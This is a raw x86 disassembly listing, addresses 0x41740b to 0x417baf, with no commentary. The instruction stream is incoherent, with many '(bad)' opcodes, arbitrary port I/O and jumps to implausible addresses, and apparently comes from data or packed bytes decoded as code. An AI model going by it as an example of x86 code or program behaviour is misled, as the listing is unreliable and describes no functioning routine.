  41740b:	xor    BYTE PTR [edi-0x3d4118b3],0x92
  417412:	dec    eax
  417413:	je     0x4173d3
  417415:	das    
  417416:	(bad)  
  417417:	jae    0x417487
  417419:	push   edx
  41741a:	and    BYTE PTR [edx-0x33],bl
  41741d:	pop    ebp
  41741e:	xchg   BYTE PTR [edi+0x4f],al
  417421:	sub    esp,DWORD PTR [esp+ebp*8-0x1c]
  417425:	push   ds
  417426:	mov    dh,0xd1
  417428:	mov    eax,ds:0x24d9ba60
  41742d:	jg     0x417404
  41742f:	(bad)  
  417430:	fist   DWORD PTR [ebp+0x15537d27]
  417436:	cld    
  417437:	adc    BYTE PTR [ecx],dh
  417439:	pop    esp
  41743a:	dec    esp
  41743b:	ins    BYTE PTR es:[edi],dx
  41743c:	div    DWORD PTR [eax]
  41743e:	cmc    
  41743f:	out    0x91,eax
  417441:	repz lock setp BYTE PTR [esi-0x74]
  417447:	mov    eax,ds:0xd5624487
  41744c:	lahf   
  41744d:	jbe    0x417464
  41744f:	mov    ebx,gs
  417451:	dec    esp
  417452:	ins    DWORD PTR es:[edi],dx
  417453:	std    
  417454:	ja     0x4173f1
  417456:	add    BYTE PTR [esi],cl
  417458:	or     ebx,DWORD PTR [esp+ecx*2-0x697b959b]
  41745f:	fisttp WORD PTR [ecx-0x2f]
  417462:	inc    esp
  417463:	arpl   WORD PTR [edx],ax
  417465:	das    
  417466:	push   ss
  417467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417468:	xor    BYTE PTR [esi+0x20570a71],dl
  41746e:	pop    esi
  41746f:	loop   0x417459
  417471:	mov    edx,0x30126ac8
  417476:	(bad)  gs:[ebp-0x4b04f2b7]
  41747d:	pop    edx
  41747e:	ds out dx,al
  417480:	fnstsw WORD PTR [ebx-0x4]
  417483:	das    
  417484:	mov    gs,WORD PTR [edi-0x1]
  417487:	mov    al,0x24
  417489:	inc    edi
  41748a:	lods   eax,DWORD PTR ds:[esi]
  41748b:	mov    edx,0xdea280a5
  417490:	(bad)  
  417492:	pop    ecx
  417493:	jmp    0x41744e
  417495:	dec    ecx
  417496:	add    edx,DWORD PTR [eax]
  417498:	mov    DWORD PTR [eax+0x609dc404],eax
  41749e:	push   edx
  41749f:	fcom   QWORD PTR [ebx+0x0]
  4174a2:	cdq    
  4174a3:	mov    WORD PTR ds:0x57e01457,ds
  4174a9:	aad    0xb7
  4174ab:	test   eax,0x14e09aaf
  4174b0:	jle    0x4174dc
  4174b2:	push   eax
  4174b3:	int    0x80
  4174b5:	mov    bh,0x9e
  4174b7:	and    DWORD PTR [esi],eax
  4174b9:	xchg   BYTE PTR [edx],dh
  4174bb:	ds cmp eax,0xda78f4d
  4174c1:	arpl   WORD PTR [ebp-0x54],dx
  4174c4:	mov    ah,0x97
  4174c6:	jne    0x417477
  4174c8:	jp     0x417465
  4174ca:	nop
  4174cb:	leave  
  4174cc:	cmp    dl,BYTE PTR [esi+0x28431242]
  4174d2:	push   esi
  4174d3:	dec    esp
  4174d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174d5:	sub    al,0x43
  4174d7:	pop    ds
  4174d8:	xchg   di,ax
  4174da:	mov    bh,0xba
  4174dc:	mov    ds:0x6e4b668a,eax
  4174e1:	loopne 0x41752b
  4174e3:	or     BYTE PTR [ebp+0x7a0039b6],0x19
  4174ea:	mov    al,ds:0xd60fc363
  4174ef:	(bad)  
  4174f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174f1:	sar    DWORD PTR [ebx-0x5c],1
  4174f4:	mov    ebx,0x69c36fed
  4174f9:	das    
  4174fa:	xchg   ecx,eax
  4174fb:	enter  0x9b99,0x8b
  4174ff:	pop    ecx
  417500:	out    0x10,al
  417502:	test   eax,0x15e7f340
  417507:	mov    ecx,0xbe6fc5bf
  41750c:	in     eax,0x4
  41750e:	sub    DWORD PTR [edi],ebx
  417510:	(bad)  
  417511:	jbe    0x41754a
  417513:	mov    cl,0xd4
  417515:	inc    eax
  417516:	lods   al,BYTE PTR ds:[esi]
  417517:	test   eax,ebp
  417519:	in     al,dx
  41751a:	(bad)  
  41751b:	mov    ch,0xe8
  41751d:	inc    eax
  41751e:	in     al,dx
  41751f:	jle    0x417518
  417521:	(bad)  
  417522:	fidivr WORD PTR [ebp+0x1c]
  417525:	xor    ch,BYTE PTR [ebx+0x20274a31]
  41752b:	fild   WORD PTR [eax-0x16edf9e7]
  417531:	std    
  417532:	(bad)  
  417533:	jp     0x417570
  417535:	clc    
  417536:	test   bl,dl
  417538:	pop    edx
  417539:	jecxz  0x4174e9
  41753b:	xchg   ebp,eax
  41753c:	pop    ecx
  41753d:	jmp    ebp
  41753f:	adc    ebp,DWORD PTR [edi-0x28074dd3]
  417545:	jbe    0x4175b2
  417547:	or     al,0xd3
  417549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41754a:	sbb    al,0x5a
  41754c:	pop    esp
  41754d:	push   esp
  41754e:	js     0x417566
  417550:	mov    bl,0xf
  417552:	push   eax
  417553:	test   eax,0xe114896a
  417558:	leave  
  417559:	adc    al,0xcb
  41755b:	ja     0x417526
  41755d:	mov    ecx,0x441b56b6
  417562:	xor    BYTE PTR [ebx+0x3cc65fd2],bl
  417568:	inc    esp
  417569:	shr    BYTE PTR [edx+esi*8],0x45
  41756d:	and    al,0xa4
  41756f:	enter  0x6d14,0x99
  417573:	xlat   BYTE PTR ds:[ebx]
  417574:	mov    fs,WORD PTR [edi+0x24]
  417577:	or     ebp,DWORD PTR [edx+0xb]
  41757a:	(bad)  
  41757b:	mov    ebx,DWORD PTR [ebp-0x5006bffa]
  417581:	xor    BYTE PTR [edx+0x14],0xfb
  417585:	fstp   QWORD PTR [edx+ecx*4-0x4c582752]
  41758c:	lods   eax,DWORD PTR ds:[esi]
  41758d:	jns    0x417549
  41758f:	call   0x2644bd43
  417594:	mov    ah,0x73
  417596:	aad    0x7
  417598:	mov    ch,0x46
  41759a:	aas    
  41759b:	or     BYTE PTR [eax-0x3f4141a9],bh
  4175a1:	sbb    ebx,esp
  4175a3:	xor    DWORD PTR ds:0x7e20b695,ebx
  4175a9:	xor    esp,DWORD PTR [esi-0x4dc632c8]
  4175af:	xchg   ebx,eax
  4175b0:	in     al,0xd7
  4175b2:	push   eax
  4175b3:	or     eax,DWORD PTR [edx]
  4175b5:	jmp    0xbf4a:0x4aab2750
  4175bc:	xchg   ebx,eax
  4175bd:	mov    dh,0x3b
  4175bf:	xlat   BYTE PTR ds:[ebx]
  4175c0:	lods   eax,DWORD PTR ds:[esi]
  4175c1:	arpl   WORD PTR [ebx+0x64582eae],di
  4175c7:	pop    ds
  4175c8:	(bad)  
  4175c9:	cmp    eax,0x281506a6
  4175ce:	rcl    BYTE PTR [edx+ebx*2+0x26fd8dba],1
  4175d5:	js     0x417614
  4175d7:	adc    BYTE PTR [edx+0x3e],dl
  4175da:	outs   dx,DWORD PTR ds:[esi]
  4175db:	data16 lahf 
  4175dd:	out    0x3f,al
  4175df:	mov    ebp,eax
  4175e1:	push   edx
  4175e2:	and    eax,0xeb07c7ab
  4175e7:	repz pusha 
  4175e9:	clc    
  4175ea:	add    DWORD PTR [eax],0x281470a0
  4175f0:	imul   esp,DWORD PTR [ebx-0x5d5e083],0xac75ab95
  4175fa:	data16 sar BYTE PTR [edx],cl
  4175fd:	pop    edx
  4175fe:	out    0x20,al
  417600:	cmp    DWORD PTR [edx+edi*2-0x288431c4],0x735fe52e
  41760b:	mov    WORD PTR [ebp+eiz*1-0x1f6a3f56],ds
  417612:	sub    eax,0xe6ebf471
  417617:	ss inc esi
  417619:	push   ebp
  41761a:	xchg   ebp,eax
  41761b:	shl    BYTE PTR [ebx-0xd],1
  41761e:	mov    eax,ds:0x16cf3a84
  417623:	(bad)  
  417624:	(bad)  
  417625:	mov    eax,0xf77f86ea
  41762a:	in     eax,0xe8
  41762c:	inc    eax
  41762d:	cmp    al,BYTE PTR [ecx+ecx*4]
  417630:	pop    ss
  417631:	add    al,0xe4
  417633:	popf   
  417634:	inc    ebx
  417635:	ja     0x4175ec
  417637:	ret    
  417638:	shl    DWORD PTR [ebp+0x3a089ac2],1
  41763e:	push   ebp
  41763f:	jg     0x4175de
  417641:	dec    edi
  417642:	adc    esi,DWORD PTR [ecx-0x61]
  417645:	outs   dx,BYTE PTR ds:[esi]
  417646:	bound  esi,QWORD PTR [edi+0x259503ca]
  41764c:	mov    esi,0xf937c7f4
  417651:	mov    bh,0x7a
  417653:	scas   al,BYTE PTR es:[edi]
  417654:	(bad)  
  417655:	loop   0x41767c
  417657:	dec    ebp
  417658:	xchg   edi,eax
  417659:	lds    eax,FWORD PTR [edi-0x19]
  41765c:	push   ecx
  41765d:	rol    ah,cl
  41765f:	inc    edx
  417660:	dec    esp
  417661:	mov    bh,0xfe
  417663:	cmp    BYTE PTR [edi-0x16],bl
  417666:	mov    eax,ds:0xc10ac160
  41766b:	enter  0x73f3,0x8c
  41766f:	pop    ebp
  417670:	pop    edx
  417671:	fnstcw WORD PTR [ebx-0x6c]
  417674:	push   ss
  417675:	xor    al,0x50
  417677:	les    ecx,FWORD PTR [esi+0x2]
  41767a:	mov    WORD PTR [edi+edi*2+0x14],fs
  41767e:	mov    cl,0xdb
  417680:	pop    ss
  417681:	jno    0x4176f6
  417683:	call   0x481795ed
  417688:	iret   
  417689:	repz sub eax,0x46951ad9
  41768f:	jae    0x4176d6
  417691:	or     al,0xd7
  417693:	call   0xfbc1c0dd
  417698:	adc    ebp,DWORD PTR [ebx]
  41769a:	aaa    
  41769b:	cs xchg ebx,eax
  41769d:	dec    edx
  41769e:	sbb    edi,ebp
  4176a0:	push   edx
  4176a1:	test   al,0x3d
  4176a3:	test   al,0xd6
  4176a5:	popf   
  4176a6:	fistp  QWORD PTR [esi]
  4176a8:	pop    eax
  4176a9:	cdq    
  4176aa:	mov    ch,0x67
  4176ac:	rcr    edi,cl
  4176ae:	mov    dh,0x24
  4176b0:	ds dec esp
  4176b2:	cmp    al,0x4e
  4176b4:	cmp    BYTE PTR ss:[ecx-0x34],ch
  4176b8:	mov    al,0xc4
  4176ba:	mov    esp,0xc8c5f607
  4176bf:	dec    edi
  4176c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176c1:	idiv   DWORD PTR [ecx-0x3f]
  4176c4:	dec    eax
  4176c5:	rol    cl,1
  4176c7:	fsqrt  
  4176c9:	retf   0xe4e4
  4176cc:	inc    eax
  4176cd:	xor    DWORD PTR [edx],eax
  4176cf:	stos   BYTE PTR es:[edi],al
  4176d0:	fnstsw WORD PTR [esi+0x6e]
  4176d3:	or     ah,BYTE PTR [edi+0x5855be6f]
  4176d9:	imul   esi,DWORD PTR [ebx],0xb
  4176dc:	test   BYTE PTR [ecx],cl
  4176de:	xchg   ebx,eax
  4176df:	xlat   BYTE PTR ds:[ebx]
  4176e0:	(bad)  [ecx]
  4176e2:	dec    edx
  4176e3:	jae    0x417679
  4176e5:	(bad)  [ebx+0x4e]
  4176e8:	pop    edx
  4176e9:	mov    bl,dl
  4176eb:	dec    edx
  4176ec:	add    eax,ecx
  4176ee:	inc    ecx
  4176ef:	(bad)  
  4176f0:	mov    al,ds:0xc3c4bc12
  4176f5:	leave  
  4176f6:	inc    eax
  4176f7:	sub    bl,BYTE PTR [edx]
  4176f9:	pop    eax
  4176fa:	cmp    esp,DWORD PTR [edi+ebp*4-0x71]
  4176fe:	(bad)  
  4176ff:	pop    edi
  417700:	add    BYTE PTR [ebx],dl
  417702:	(bad)  
  417703:	out    dx,al
  417704:	push   ecx
  417705:	fisttp WORD PTR [ebp-0x34]
  417708:	pop    ebp
  417709:	(bad)  
  41770a:	cs (bad) 
  41770c:	xor    eax,0x6299fe20
  417711:	fild   QWORD PTR ds:[edx+0x258f1d0e]
  417718:	sub    ecx,DWORD PTR [ebx]
  41771a:	xchg   ah,al
  41771c:	xor    al,ch
  41771e:	cmp    DWORD PTR [edi],edx
  417720:	xor    eax,edx
  417722:	xlat   BYTE PTR ds:[ebx]
  417723:	dec    esi
  417724:	clc    
  417725:	neg    DWORD PTR [esi]
  417727:	xor    BYTE PTR [edi+0x54],0xed
  41772b:	lea    edi,[edi+0x19]
  41772e:	iret   
  41772f:	mov    eax,ds:0xcee04fb4
  417734:	shl    BYTE PTR [edx],1
  417736:	enter  0x5573,0x3e
  41773a:	or     al,0xe8
  41773c:	daa    
  41773d:	fistp  DWORD PTR [ebp-0x6f]
  417740:	pop    edx
  417741:	out    0xa5,eax
  417743:	xlat   BYTE PTR ds:[ebx]
  417744:	stos   DWORD PTR es:[edi],eax
  417745:	fimul  WORD PTR [eax]
  417747:	data16 adc BYTE PTR [edi+0x46afdb7d],ch
  41774e:	dec    esi
  41774f:	test   al,0xcc
  417751:	sub    eax,edx
  417753:	add    BYTE PTR [eax+0x19],0x8d
  417757:	jmp    0xc35a4349
  41775c:	sub    DWORD PTR [ebp-0x7e545d47],eax
  417762:	xchg   edx,eax
  417763:	mov    al,ds:0x1dcdc61b
  417768:	dec    esp
  417769:	mov    edi,0x2ffa0b69
  41776e:	aam    0xa0
  417770:	inc    esi
  417771:	xchg   ebp,eax
  417772:	jo     0x417791
  417774:	dec    ebp
  417775:	es cmp eax,0x1683da7c
  41777b:	xor    al,0x9c
  41777d:	xlat   BYTE PTR ds:[ebx]
  41777e:	pop    edx
  41777f:	fwait
  417780:	popf   
  417781:	xchg   ebx,eax
  417782:	daa    
  417783:	(bad)  
  417785:	add    DWORD PTR [eax+ebx*8-0xd42ca80],0xdcc7f044
  417790:	stos   BYTE PTR es:[edi],al
  417791:	icebp  
  417792:	cmp    al,0x6b
  417794:	xlat   BYTE PTR ds:[ebx]
  417795:	mov    ds:0x7061eb8e,al
  41779a:	add    dh,BYTE PTR [ebx+edi*4+0x53af40b]
  4177a1:	es es adc al,0x66
  4177a5:	dec    eax
  4177a6:	rol    bh,0xb4
  4177a9:	jmp    0x546f5
  4177ae:	pop    ebx
  4177af:	pop    eax
  4177b0:	fnsetpm(287 only) 
  4177b2:	loope  0x4177a5
  4177b4:	repz mov ebx,0x78be7dcf
  4177ba:	in     al,dx
  4177bb:	lods   al,BYTE PTR ds:[esi]
  4177bc:	ds (bad) 
  4177be:	inc    esp
  4177bf:	push   edi
  4177c0:	push   eax
  4177c1:	jnp    0x417822
  4177c3:	js     0x417801
  4177c5:	push   ds
  4177c6:	lods   eax,DWORD PTR ds:[esi]
  4177c7:	lods   eax,DWORD PTR ds:[esi]
  4177c8:	add    esp,DWORD PTR [edi+ecx*1-0x46584488]
  4177cf:	push   esi
  4177d0:	mov    ecx,esp
  4177d2:	dec    ebp
  4177d3:	call   0x14509939
  4177d8:	pop    esi
  4177d9:	xchg   DWORD PTR [edi],eax
  4177db:	arpl   WORD PTR [esi-0xb],bp
  4177de:	scas   eax,DWORD PTR es:[edi]
  4177df:	test   DWORD PTR [ecx-0x18d9b0bf],ebp
  4177e5:	mov    eax,ds:0x6a892ebb
  4177ea:	jmp    0x417860
  4177ec:	js     0x4177e4
  4177ee:	jno    0x4177db
  4177f0:	push   ebx
  4177f1:	jb     0x4177b1
  4177f3:	imul   esi,DWORD PTR [edi],0xb6b48319
  4177f9:	jg     0x417835
  4177fb:	sar    bh,cl
  4177fd:	push   0xffffffc5
  4177ff:	xor    DWORD PTR [ecx],0x129c3e7d
  417805:	or     eax,0xcfb20cf8
  41780a:	push   0x15
  41780c:	(bad)  
  41780d:	mov    ah,BYTE PTR [ecx]
  41780f:	mov    cl,0xd9
  417811:	and    DWORD PTR [eax+0x308b22a4],0x95c55f34
  41781b:	aaa    
  41781c:	or     DWORD PTR [edx-0xf],eax
  41781f:	xor    ebp,edx
  417821:	fadd   QWORD PTR ds:0xf285dd5c
  417827:	pop    es
  417828:	inc    eax
  417829:	ffreep st(4)
  41782b:	(bad)  
  41782c:	push   eax
  41782d:	shr    DWORD PTR [ebx],cl
  41782f:	push   ebp
  417830:	or     al,0x8c
  417832:	sbb    ebx,DWORD PTR [edi+0x73]
  417835:	dec    ebp
  417836:	inc    esi
  417837:	sub    esi,esp
  417839:	xor    ecx,eax
  41783b:	mov    edi,0x7b05e443
  417840:	fiadd  WORD PTR ds:0xeb8bb31a
  417846:	out    dx,eax
  417847:	jle    0x417815
  417849:	je     0x41780c
  41784b:	fild   QWORD PTR [edi-0xad2aa60]
  417851:	std    
  417852:	into   
  417853:	sub    ecx,ebx
  417855:	xor    eax,0x964226bc
  41785a:	cli    
  41785b:	nop
  41785c:	cmp    edi,DWORD PTR [edx-0x3773a7c3]
  417862:	sub    al,BYTE PTR [edi]
  417864:	stos   BYTE PTR es:[edi],al
  417865:	jne    0x4178e6
  417867:	js     0x4177f6
  417869:	adc    eax,0x8a6cc844
  41786e:	inc    esi
  41786f:	out    0x67,al
  417871:	mov    cl,0xda
  417873:	std    
  417874:	and    eax,0x3d44c061
  417879:	sub    eax,0x7f2e32b8
  41787e:	(bad)  
  41787f:	out    dx,al
  417880:	pop    eax
  417881:	sbb    al,0x84
  417883:	pop    ebx
  417884:	mov    edi,DWORD PTR [ebx-0x4e]
  417887:	sbb    bh,BYTE PTR [edi+0x40]
  41788a:	or     DWORD PTR cs:[ecx],0xfffffffc
  41788e:	test   BYTE PTR [edx],0xe6
  417891:	sbb    edi,DWORD PTR ss:[ebx+0x24]
  417895:	push   es
  417896:	xchg   esi,eax
  417897:	sbb    edx,edx
  417899:	aad    0x4f
  41789b:	xchg   esp,eax
  41789c:	inc    ecx
  41789d:	fistp  QWORD PTR [esi-0x2cbfa54f]
  4178a3:	into   
  4178a4:	leave  
  4178a5:	xor    eax,0x1c7a7e8e
  4178aa:	pushf  
  4178ab:	jmp    0x7a6d1b32
  4178b0:	sub    esp,DWORD PTR [eax+0x65719afb]
  4178b6:	jbe    0x4178dd
  4178b8:	or     eax,0x80884f3c
  4178bd:	pop    esi
  4178be:	xchg   edx,eax
  4178bf:	mov    bl,0xf2
  4178c1:	pop    ebx
  4178c2:	cmp    eax,0xf50af0d9
  4178c7:	sub    eax,0xb0966236
  4178cc:	mov    dl,0x70
  4178ce:	push   ss
  4178cf:	inc    ebx
  4178d0:	adc    dh,ah
  4178d2:	lds    esp,FWORD PTR [ecx+ebx*1]
  4178d5:	mov    esp,0x84dc1e31
  4178da:	adc    ecx,DWORD PTR [edi+0x77]
  4178dd:	into   
  4178de:	jp     0x4178bd
  4178e0:	mov    eax,0x2b72db19
  4178e5:	mov    eax,ds:0x12f04389
  4178ea:	and    DWORD PTR [ebp-0x1e5425f3],ebx
  4178f0:	retf   
  4178f1:	jle    0x41790d
  4178f3:	outs   dx,BYTE PTR ds:[esi]
  4178f4:	sahf   
  4178f5:	adc    eax,0x5795a74a
  4178fa:	scas   eax,DWORD PTR es:[edi]
  4178fb:	out    0xe8,al
  4178fd:	push   esp
  4178fe:	jno    0x417880
  417900:	aaa    
  417901:	test   dl,0x5f
  417904:	int3   
  417905:	mov    dh,0xd7
  417907:	scas   al,BYTE PTR es:[edi]
  417908:	or     edi,DWORD PTR [ecx-0x496a9ad0]
  41790e:	jl     0x417911
  417910:	xchg   ebx,eax
  417911:	mov    dh,0x8f
  417913:	setne  bl
  417916:	js     0x4178dc
  417918:	sub    DWORD PTR [ecx+0x36cba967],ebp
  41791e:	xor    eax,DWORD PTR [ebx]
  417920:	outs   dx,DWORD PTR ds:[esi]
  417921:	dec    esp
  417922:	mov    dl,0xc1
  417924:	mov    cl,0x2f
  417926:	inc    ecx
  417927:	js     0x4178d2
  417929:	jne    0x4179a4
  41792b:	outs   dx,BYTE PTR ds:[esi]
  41792c:	cs cwde 
  41792e:	jge    0x4178f7
  417930:	mov    dh,0x98
  417932:	mov    ds:0x3674147d,al
  417937:	hlt    
  417938:	or     BYTE PTR [edi+ebp*4-0x6e],cl
  41793c:	xor    DWORD PTR [edx+0x4a246463],eax
  417942:	pop    esi
  417943:	and    DWORD PTR [esp+esi*2-0x4000c250],0x92583159
  41794e:	push   0x10974321
  417953:	push   cs
  417954:	mov    dh,0xb2
  417956:	lods   al,BYTE PTR ds:[esi]
  417957:	not    ecx
  417959:	or     BYTE PTR [ecx],dh
  41795b:	ss dec edx
  41795d:	sub    esi,edi
  41795f:	imul   edx,esp,0xa303bff3
  417965:	fwait
  417966:	xchg   ecx,eax
  417967:	repz pop ecx
  417969:	xchg   esp,esp
  41796b:	in     eax,0x5c
  41796d:	pop    esi
  41796e:	jmp    0xab94:0x3d7e13a2
  417975:	lods   eax,DWORD PTR ds:[esi]
  417976:	test   BYTE PTR fs:[eax-0x2e],dl
  41797a:	mov    BYTE PTR [ebx+0x3e0f2cdd],0xf7
  417981:	or     al,0xc5
  417983:	(bad)  
  417984:	adc    bl,BYTE PTR [edi+0x3b]
  417987:	fisttp WORD PTR [esi]
  41798a:	jl     0x417973
  41798c:	push   0xc
  41798e:	jp     0x4179ad
  417990:	xchg   ecx,eax
  417991:	pushf  
  417992:	push   ecx
  417993:	in     al,dx
  417994:	aas    
  417995:	lahf   
  417996:	push   edi
  417997:	push   edi
  417998:	xchg   edx,eax
  417999:	xor    eax,0x977f8849
  41799e:	rol    DWORD PTR [ebp-0x70408879],1
  4179a4:	ret    
  4179a5:	mov    bl,0x1e
  4179a7:	or     BYTE PTR [ebx-0x76ce2046],ch
  4179ad:	pushf  
  4179ae:	mov    cl,0xc
  4179b0:	pop    esp
  4179b1:	scas   eax,DWORD PTR es:[edi]
  4179b2:	into   
  4179b3:	inc    esp
  4179b4:	jmp    edi
  4179b6:	mov    ebx,0x345b5d83
  4179bb:	mov    edi,0xd10581b7
  4179c0:	out    0x93,al
  4179c2:	inc    esp
  4179c3:	retf   
  4179c4:	mov    esi,0xedfa4e59
  4179c9:	fsub   st,st(4)
  4179cb:	sub    al,0x81
  4179cd:	les    edi,FWORD PTR [edi]
  4179cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179d0:	pop    eax
  4179d1:	pop    edx
  4179d2:	push   ebx
  4179d3:	and    BYTE PTR [edx+0x34],bh
  4179d6:	dec    edx
  4179d7:	xor    eax,0xe6f42106
  4179dc:	inc    edi
  4179dd:	dec    eax
  4179de:	jnp    0x4179ac
  4179e0:	div    ah
  4179e2:	popa   
  4179e3:	xor    BYTE PTR [esi-0x28390c55],cl
  4179e9:	bound  ebx,QWORD PTR [ebx]
  4179eb:	sbb    al,0xf8
  4179ed:	ss mov bl,0x38
  4179f0:	xchg   esi,edi
  4179f2:	cld    
  4179f3:	dec    esp
  4179f4:	in     eax,dx
  4179f5:	xchg   DWORD PTR [ecx],ecx
  4179f7:	test   DWORD PTR [ebx-0xe3c97],ebx
  4179fd:	inc    edx
  4179fe:	jmp    0x1e8bcb1b
  417a03:	repnz sub BYTE PTR [eax+0x8],ah
  417a07:	test   al,0x85
  417a09:	pop    ebp
  417a0a:	cmp    dl,BYTE PTR [ecx+0x18]
  417a0d:	sub    al,0x3d
  417a0f:	mov    edi,0x6b4b37f1
  417a14:	inc    edi
  417a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a16:	xchg   BYTE PTR [esi+0x4d],bh
  417a19:	push   ds
  417a1a:	test   eax,0xe4c0e4b5
  417a1f:	sahf   
  417a20:	in     eax,dx
  417a21:	outs   dx,BYTE PTR ds:[esi]
  417a22:	(bad)  
  417a23:	xor    ebx,esi
  417a25:	push   ss
  417a26:	mov    ds:0x8d00910b,eax
  417a2b:	out    0x8f,al
  417a2d:	or     ah,BYTE PTR [ebp+0x7c]
  417a30:	add    eax,0xf8bce74
  417a35:	jns    0x417a95
  417a37:	dec    esi
  417a38:	out    dx,al
  417a39:	jp     0x417a3f
  417a3b:	call   0xbfd2570a
  417a40:	dec    edi
  417a41:	repnz or ebp,DWORD PTR [eax]
  417a44:	sub    BYTE PTR [edx+0x6f],al
  417a47:	adc    dl,BYTE PTR [edx-0x12026020]
  417a4d:	inc    ebp
  417a4e:	retf   
  417a4f:	jle    0x4179ff
  417a51:	adc    eax,edx
  417a53:	les    eax,FWORD PTR [esi+0x1a]
  417a56:	xlat   BYTE PTR ds:[ebx]
  417a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a58:	mov    dh,0xea
  417a5a:	jbe    0x417a28
  417a5c:	mov    bh,0xd
  417a5e:	sbb    edi,ebx
  417a60:	or     eax,0x1fdce3df
  417a65:	sbb    DWORD PTR [edi+eax*4+0x36],ebx
  417a69:	test   edi,esp
  417a6b:	ins    DWORD PTR es:[edi],dx
  417a6c:	jmp    0x6472:0x830b6312
  417a73:	add    DWORD PTR [esi+eax*8],ebx
  417a76:	mov    esp,0xb18fbd14
  417a7b:	ins    DWORD PTR es:[edi],dx
  417a7c:	addr16 mov ds:0x8b0b,eax
  417a80:	jmp    0x417ac3
  417a82:	xor    al,0x72
  417a84:	imul   ebx,DWORD PTR [ebp+edi*4-0xabcaa04],0xb26319f0
  417a8f:	out    0xb8,eax
  417a91:	push   edx
  417a92:	loop   0x417a14
  417a94:	push   cs
  417a95:	jo     0x417a8b
  417a97:	mov    eax,0xa37bfe72
  417a9c:	ss push esp
  417a9e:	outs   dx,DWORD PTR ds:[esi]
  417a9f:	int    0xd3
  417aa1:	out    dx,eax
  417aa2:	xor    dh,BYTE PTR [edi+0x18]
  417aa5:	fyl2xp1 
  417aa7:	inc    ebx
  417aa8:	mov    esp,0x57c6cdd9
  417aad:	mov    ebx,gs
  417aaf:	bound  ebp,QWORD PTR [ecx-0x4a]
  417ab2:	dec    esi
  417ab3:	fld    TBYTE PTR [ebp-0x12]
  417ab6:	sub    ecx,DWORD PTR [esi-0x32867f9d]
  417abc:	mov    eax,0x73f08b1f
  417ac1:	add    edx,ebx
  417ac3:	xlat   BYTE PTR ds:[ebx]
  417ac4:	xchg   ecx,eax
  417ac5:	or     bl,BYTE PTR [eax]
  417ac7:	jg     0x417af0
  417ac9:	test   DWORD PTR [eax+0x5d],0xac1dba44
  417ad0:	lds    ebx,FWORD PTR [edx]
  417ad2:	push   esp
  417ad3:	scas   eax,DWORD PTR es:[edi]
  417ad4:	mov    bh,0x5d
  417ad6:	mov    esi,0x8dc4518e
  417adb:	sbb    eax,0x7d9d9ea1
  417ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ae1:	into   
  417ae2:	jmp    0x417b0c
  417ae4:	xchg   bl,dh
  417ae6:	push   0xffffffa6
  417ae8:	scas   al,BYTE PTR es:[edi]
  417ae9:	mov    ds:0x8df6d3d7,al
  417aee:	data16 jnp 0x417b0f
  417af1:	lahf   
  417af2:	pop    ds
  417af3:	jb     0x417a8a
  417af5:	fnstcw WORD PTR [edi]
  417af7:	cld    
  417af8:	icebp  
  417af9:	push   eax
  417afa:	jge    0x417b4e
  417afc:	shr    DWORD PTR [edi],1
  417afe:	sbb    ebx,DWORD PTR [ebp+0x736c7d11]
  417b04:	mov    eax,0x9f0ad551
  417b09:	test   al,0x57
  417b0b:	aam    0x9
  417b0d:	cmp    ebx,DWORD PTR [ecx+0x538c8f0b]
  417b13:	xchg   esp,eax
  417b14:	out    dx,eax
  417b15:	mov    WORD PTR [edi-0x13],ds
  417b18:	inc    ebx
  417b19:	into   
  417b1a:	das    
  417b1b:	mov    ebp,edi
  417b1d:	ret    
  417b1e:	bound  ebx,QWORD PTR [esi-0x4e]
  417b21:	dec    esp
  417b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b23:	dec    ebx
  417b24:	xchg   esp,eax
  417b25:	xchg   edx,eax
  417b26:	retf   
  417b27:	sbb    dl,al
  417b29:	pop    ss
  417b2a:	mov    eax,DWORD PTR [edx-0xca27c2]
  417b30:	xchg   DWORD PTR [eax-0x63],edi
  417b33:	jmp    0xe2b5b1e9
  417b38:	(bad)  
  417b39:	push   ds
  417b3a:	sar    DWORD PTR [ebx+0x6a09eb1d],0xec
  417b41:	xlat   BYTE PTR ds:[ebx]
  417b42:	repz imul DWORD PTR [ecx]
  417b45:	arpl   WORD PTR [ebx+0x18],dx
  417b48:	leave  
  417b49:	jno    0x417aff
  417b4b:	clc    
  417b4c:	pop    esi
  417b4d:	push   esi
  417b4e:	xchg   BYTE PTR [ebx-0x4baed01e],bh
  417b54:	(bad)  
  417b56:	add    cl,BYTE PTR [edx]
  417b58:	inc    ebp
  417b59:	cs pushf 
  417b5b:	outs   dx,BYTE PTR ds:[esi]
  417b5c:	pusha  
  417b5d:	pop    esi
  417b5e:	lock jmp 0x417b48
  417b61:	cmp    DWORD PTR [edx],ebp
  417b63:	fbld   TBYTE PTR [edx+0x34]
  417b66:	sub    BYTE PTR [eax+0xe184a61],cl
  417b6c:	mov    ebx,0xeaa356cd
  417b71:	shl    ebx,cl
  417b73:	imul   esi,DWORD PTR [eax],0x1b5c3833
  417b79:	mov    WORD PTR [ecx+eiz*8],ss
  417b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b7d:	mov    ebx,0xe8030e3f
  417b82:	mov    dl,BYTE PTR ds:0x6f1b0edd
  417b88:	lods   eax,DWORD PTR ds:[esi]
  417b89:	cmp    bh,BYTE PTR [ecx-0x1114b79c]
  417b8f:	outs   dx,DWORD PTR ds:[esi]
  417b90:	dec    edx
  417b91:	push   ebp
  417b92:	adc    BYTE PTR [eax],dh
  417b94:	dec    ebp
  417b95:	(bad)  [eax+0x51]
  417b98:	fwait
  417b99:	rep lods al,BYTE PTR ds:[esi]
  417b9b:	sbb    BYTE PTR [eax],al
  417b9d:	out    dx,al
  417b9e:	aam    0x89
  417ba0:	jmp    0x417b5a
  417ba2:	jmp    0x1246a290
  417ba7:	xor    al,0xd3
  417ba9:	and    eax,0x4677abf3
  417bae:	push   esi
  417baf:	adc    bh,cl
